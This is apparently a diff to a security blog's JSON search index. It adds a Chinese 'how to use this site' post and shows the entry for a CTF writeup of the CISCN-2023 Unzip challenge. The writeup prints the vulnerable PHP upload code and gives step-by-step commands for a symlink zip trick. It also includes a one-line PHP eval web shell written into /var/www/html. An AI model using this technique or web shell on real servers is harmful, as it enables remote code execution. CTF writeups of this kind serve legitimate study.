@@ -1,5 +1,11 @@
 [
   {
+    "objectID": "1750344318",
+    "permalink": "/post/%E6%9C%AC%E7%AB%99%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/",
+    "title": "本站食用指南","content": "\r首页\r三大类\nCTF-Great 收集一些比较好的题目\nwriteup 比赛writeup记录和靶场记录\nLeading 网络安全学习\n侧边栏和归档\r这两处作用相同，进行分类、归档\n配有标签，方便食用 其他\r其他就不废话了，md，突然感觉一篇都是废话，一句话，欢迎订阅和打赏\n搜索栏 评论 关灯 啥的 ","date": "2025-06-19 22:45:18",
+    "updated": "2025-06-19 22:45:18"
+  }, 
+  {
     "objectID": "1750219200",
     "permalink": "/post/ciscn_unzip/",
     "title": "CISCN-2023 Unzip","content": "\runzip\r题目源码\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]) === \u0026#39;application/zip\u0026#39;){ exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); }; //only this! 分析\r关键代码\nexec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); // -o参数：如有同名的文件直接覆盖 上传.zip文件后 1、验证MIME值、是否为.zip文件 2、先cd /tmp目录，之后解压文件\n解题的关键在于上传的文件在/tmp目录下，上传的马无法访问 tips： 软连接：可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。\n查询unzip相关的资料，发现了这个命令可以与软连接挂钩\n思路\r先上传一个软连接的压缩包，解压后指向-\u0026gt;/var/www/html/ 后上传一个有软连接和马的压缩包，解压后可在线访问 1、创建软连接并压缩\nmkdir hh cd hh ln -s /var/www/html link zip --symlinks link.zip link 2、删除原有的link软连接，创建与软连接同名的link文件夹，在link文件夹内写马,最后压缩\nrm link mkdir link cd link echo \u0026#34;\u0026lt;?php echo 123;eval($_POST[0]);?\u0026gt;\u0026#34; \u0026gt; shell.php cd .. zip -r link1.zip ./link ls 3、依次上传link.zip和link1.zip,访问url/shell.php\n","date": "2025-06-18 12:00:00",
